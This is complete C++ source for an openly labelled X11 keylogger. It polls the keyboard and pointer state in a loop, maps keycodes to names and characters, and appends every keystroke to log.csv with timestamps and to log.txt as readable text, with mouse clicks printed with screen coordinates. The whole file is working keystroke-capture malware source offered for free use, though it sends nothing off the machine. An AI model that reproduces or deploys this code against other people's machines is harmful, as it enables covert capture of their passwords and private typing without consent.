/*
** Simple X11 Keylogger.
** Developed by Roberto Tacconelli 10 May 2011 (05/10/2011)
** http://www.st4ck.com
**
** Compile: g++ -lX11 keylogger.cpp -o keylogger
**
** This program is free software: you can redistribute it and/or modify
** it under the terms of the GNU General Public License as published by
** the Free Software Foundation, either version 3 of the License, or
** (at your option) any later version.
**
** This program is distributed in the hope that it will be useful,
** but WITHOUT ANY WARRANTY; without even the implied warranty of
** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
** GNU General Public License for more details.
**
** You should have received a copy of the GNU General Public License
** along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <string.h>

double gettime()
{
    timeval tim;
    gettimeofday(&tim, NULL);
    double t1=tim.tv_sec+(tim.tv_usec/1000000.0);
    return t1;
}

bool keymapKeyState(char* keymap, int key)
{
    return (keymap[key/8] >> (key-8*(key/8))) & 0x01;
}

bool mousemapState(unsigned int map, int button)
{
    return (map & (1 << button));
}

const char* keyName(int n)
{
    if(n==9) return "ESCAPE";
    if(n==10) return "1";
    if(n==11) return "2";
    if(n==12) return "3";
    if(n==13) return "4";
    if(n==14) return "5";
    if(n==15) return "6";
    if(n==16) return "7";
    if(n==17) return "8";
    if(n==18) return "9";
    if(n==19) return "0";
    if(n==20) return "MINUS";
    if(n==21) return "EQUALS";
    if(n==22) return "BACK_SPACE";
    if(n==23) return "TAB";
    if(n==24) return "Q";
    if(n==25) return "W";
    if(n==26) return "E";
    if(n==27) return "R";
    if(n==28) return "T";
    if(n==29) return "Y";
    if(n==30) return "U";
    if(n==31) return "I";
    if(n==32) return "O";
    if(n==33) return "P";
    if(n==34) return "OPEN_BRACKET";
    if(n==35) return "CLOSE_BRACKET";
    if(n==36) return "ENTER";
    if(n==37) return "CONTROL";
    if(n==38) return "A";
    if(n==39) return "S";
    if(n==40) return "D";
    if(n==41) return "F";
    if(n==42) return "G";
    if(n==43) return "H";
    if(n==44) return "J";
    if(n==45) return "K";
    if(n==46) return "L";
    if(n==47) return "SEMICOLON";
    if(n==48) return "QUOTE";
    if(n==49) return "TILDE";
    if(n==50) return "SHIFT";
    if(n==51) return "BACK_SLASH";
    if(n==52) return "Z";
    if(n==53) return "X";
    if(n==54) return "C";
    if(n==55) return "V";
    if(n==56) return "B";
    if(n==57) return "N";
    if(n==58) return "M";
    if(n==59) return "COMMA";
    if(n==60) return "PERIOD";
    if(n==61) return "SLASH";
    if(n==62) return "SHIFT";
    if(n==63) return "MULTIPLY";
    if(n==64) return "ALT";
    if(n==65) return "SPACE";
    if(n==66) return "CAPS_LOCK";
    if(n==67) return "F1";
    if(n==68) return "F2";
    if(n==69) return "F3";
    if(n==70) return "F4";
    if(n==71) return "F5";
    if(n==72) return "F6";
    if(n==73) return "F7";
    if(n==74) return "F8";
    if(n==75) return "F9";
    if(n==76) return "F10";
    if(n==77) return "NUM_LOCK";
    if(n==78) return "SCROLL_LOCK";
    if(n==79) return "NUMPAD7";
    if(n==80) return "NUMPAD8";
    if(n==81) return "NUMPAD9";
    if(n==82) return "SUBTRACT";
    if(n==83) return "NUMPAD4";
    if(n==84) return "NUMPAD5";
    if(n==85) return "NUMPAD6";
    if(n==86) return "ADD";
    if(n==87) return "NUMPAD1";
    if(n==88) return "NUMPAD2";
    if(n==89) return "NUMPAD3";
    if(n==90) return "NUMPAD0";
    if(n==91) return "DECIMAL";
    if(n==95) return "F11";
    if(n==96) return "F12";
    if(n==227) return "THINKPAD_FN";
    if(n==233) return "THINKPAD_FORWARD";
    if(n==234) return "THINKPAD_BACK";
    if(n==133) return "SUPER";
    if(n==134) return "SUPER";
    if(n==135) return "MENU";
    if(n==104) return "NUMPAD_ENTER";
    if(n==105) return "CONTROL";
    if(n==106) return "DIVIDE";
    if(n==107) return "PRINT_SCREEN";
    if(n==108) return "ALT";
    if(n==110) return "HOME";
    if(n==111) return "UP";
    if(n==112) return "PAGE_UP";
    if(n==113) return "LEFT";
    if(n==114) return "RIGHT";
    if(n==115) return "END";
    if(n==116) return "DOWN";
    if(n==117) return "PAGE_DOWN";
    if(n==118) return "INSERT";
    if(n==119) return "DELETE";
    if(n==127) return "PAUSE";
    return "*";
}

const char* keyChr(int n)
{
    if(n==9) return " ESC ";
    if(n==10) return "1";
    if(n==11) return "2";
    if(n==12) return "3";
    if(n==13) return "4";
    if(n==14) return "5";
    if(n==15) return "6";
    if(n==16) return "7";
    if(n==17) return "8";
    if(n==18) return "9";
    if(n==19) return "0";
    if(n==20) return "-";
    if(n==21) return "=";
    if(n==22) return " BCKSPCE ";
    if(n==23) return "\t";
    if(n==24) return "q";
    if(n==25) return "w";
    if(n==26) return "e";
    if(n==27) return "r";
    if(n==28) return "t";
    if(n==29) return "y";
    if(n==30) return "u";
    if(n==31) return "i";
    if(n==32) return "o";
    if(n==33) return "p";
    if(n==34) return "[";
    if(n==35) return "]";
    if(n==36) return "\n";
    if(n==37) return " CTRL ";
    if(n==38) return "a";
    if(n==39) return "s";
    if(n==40) return "d";
    if(n==41) return "f";
    if(n==42) return "g";
    if(n==43) return "h";
    if(n==44) return "j";
    if(n==45) return "k";
    if(n==46) return "l";
    if(n==47) return ";";
    if(n==48) return "'";
    if(n==49) return "`";
    if(n==50) return " SHFT ";
    if(n==51) return "\\";
    if(n==52) return "z";
    if(n==53) return "x";
    if(n==54) return "c";
    if(n==55) return "v";
    if(n==56) return "b";
    if(n==57) return "n";
    if(n==58) return "m";
    if(n==59) return ",";
    if(n==60) return ".";
    if(n==61) return "/";
    if(n==62) return " SHFT ";
    if(n==63) return "*";
    if(n==64) return " ALT ";
    if(n==65) return " ";
    if(n==66) return " CAPSLOCK ";
    if(n==67) return " F1 ";
    if(n==68) return " F2 ";
    if(n==69) return " F3 ";
    if(n==70) return " F4 ";
    if(n==71) return " F5 ";
    if(n==72) return " F6 ";
    if(n==73) return " F7 ";
    if(n==74) return " F8 ";
    if(n==75) return " F9 ";
    if(n==76) return " F10 ";
    if(n==77) return " NLOCK ";
    if(n==78) return " SCRLLCK ";
    if(n==79) return " N7";
    if(n==80) return " N8";
    if(n==81) return " N9";
    if(n==82) return "-";
    if(n==83) return " N4";
    if(n==84) return " N5";
    if(n==85) return " N6";
    if(n==86) return "+";
    if(n==87) return " N1";
    if(n==88) return " N2";
    if(n==89) return " N3";
    if(n==90) return " N0";
    if(n==91) return " .";
    if(n==95) return " F11 ";
    if(n==96) return " F12 ";
    if(n==227) return " THINKPAD_FN ";
    if(n==233) return " THINKPAD_FORWARD ";
    if(n==234) return " THINKPAD_BACK ";
    if(n==133) return " SUPER ";
    if(n==134) return " SUPER ";
    if(n==135) return " MENU ";
    if(n==104) return "\n";
    if(n==105) return " CTRL ";
    if(n==106) return "/";
    if(n==107) return " PRNTSCRN ";
    if(n==108) return " ALT ";
    if(n==110) return " HOME ";
    if(n==111) return " UP ";
    if(n==112) return " PGUP ";
    if(n==113) return " LEFT ";
    if(n==114) return " RIGHT ";
    if(n==115) return " END ";
    if(n==116) return " DOWN ";
    if(n==117) return " PGDOWN ";
    if(n==118) return " INS ";
    if(n==119) return " DEL ";
    if(n==127) return " PAUSE ";
    return " OTHER ";
}

int main()
{
	Display *display_name;
	int depth,screen,connection;
	display_name = XOpenDisplay(NULL);
	screen = DefaultScreen(display_name);
	depth = DefaultDepth(display_name,screen);
	connection = ConnectionNumber(display_name);
	printf("Keylogger started\n\nInfo about X11 connection:\n");
	printf(" The display is::%s\n",XDisplayName((char*)display_name));
	printf(" Width::%d\tHeight::%d\n",
	DisplayWidth(display_name,screen),
	DisplayHeight(display_name,screen));
	printf(" Connection number is %d\n",connection);

	printf("\n\nLogging started.\n\n");

	FILE* myFile;
	char keys_return[32];
	char keys_last[32];
	unsigned int mouse_return;
	unsigned int mouse_last;
	memset(keys_return, 0, sizeof(keys_return));
	mouse_return = 0;
	Window w;
	Window nw;
	w = DefaultRootWindow(display_name);
	while (1)
	{
		int mx, my;
		int n;
		memcpy(keys_last, keys_return, sizeof(keys_return));
		mouse_last = mouse_return;
		XQueryKeymap(display_name, keys_return);
		XQueryPointer(display_name, w, &nw, &nw, &mx, &my, &n, &n, 
								&mouse_return);
		for (int mouseID = 8; mouseID <= 10; mouseID++) {
			if (mousemapState(mouse_return, mouseID))
			if (not mousemapState(mouse_last, mouseID)) {
				printf("%.20f: %d %d %d\n", gettime(), mouseID,
									mx, my);
			}
		}
		for (int keyID = 0; keyID < 256; keyID++)
		{
		    if (keymapKeyState(keys_return, keyID))
		    if (not keymapKeyState(keys_last, keyID))
		    {
			myFile = fopen("log.csv", "a+");
			printf("%.20f: +%d %s\n", 
				gettime(), keyID, keyName(keyID));
			fprintf(myFile, "%.20f\t+%d\t%s\n", 
					 gettime(), keyID, keyName(keyID));
			fclose(myFile);
			
			myFile = fopen("log.txt", "a+");
			fprintf(myFile, "%s", keyChr(keyID));
			fclose(myFile);
		    }
		    if(not keymapKeyState(keys_return, keyID))
		    if(keymapKeyState(keys_last, keyID))
		    {
			myFile = fopen("log.csv", "a+");
			printf("%.20f: -%d %s\n", 
				gettime(), keyID, keyName(keyID));
			fprintf(myFile, "%.20f\t-%d\t%s\n", 
					 gettime(), keyID, keyName(keyID));
			fclose(myFile);
		    }
		}
		usleep(30000);
	}
	XCloseDisplay(display_name);
}
